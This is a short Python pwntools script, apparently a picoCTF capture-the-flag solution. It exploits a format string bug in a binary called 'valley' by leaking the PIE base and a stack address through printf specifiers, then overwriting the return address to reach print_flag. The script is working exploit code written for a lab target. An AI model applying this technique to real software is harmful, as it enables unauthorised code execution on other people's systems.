# made by mel

# format string vulnerable binary
# 	1. leak the PIE base address of the binary to bypass pie protection
#	2. use printf write payload to write to the return address on the stack
#		* these were mainly found through trial and error

#	had some issues with making this work remotely
#	just know that, the stack can be unpredictable if its outside the stack frame
#	with binex make sure to only stay within the stack frame for stack stuff in order to maintain consistency

from pwn import *

context.binary = ELF("./valley")

with remote("shape-facility.picoctf.net", 61240) as p:
#with process(["./valley"]) as p:
	p.recvuntil(b"Shouting: \n")

	def printf(payl):
		p.sendline(payl)
		return int(p.recvline()[len("You heard in the distance: "):][2:],16)

	#get the base address from the leak
	context.binary.address = printf(b"%21$p")-0x13-5120
	print(f"PIE base address: {hex(context.binary.address)}")

	#get the return address on the stack
	ret_addr_stack = printf(b"%20$p")-8

	print(f"{hex(ret_addr_stack)} is where the return address is")
	print(f"{hex(context.binary.sym["print_flag"])} is our target destination")

	#write to the return address
	payl = fmtstr_payload(offset=6,
		writes={ret_addr_stack: context.binary.sym["print_flag"]},
		write_size="short",
		strategy="fast"
	)
	assert(len(payl) < 100)
	p.sendline(payl)

	p.interactive()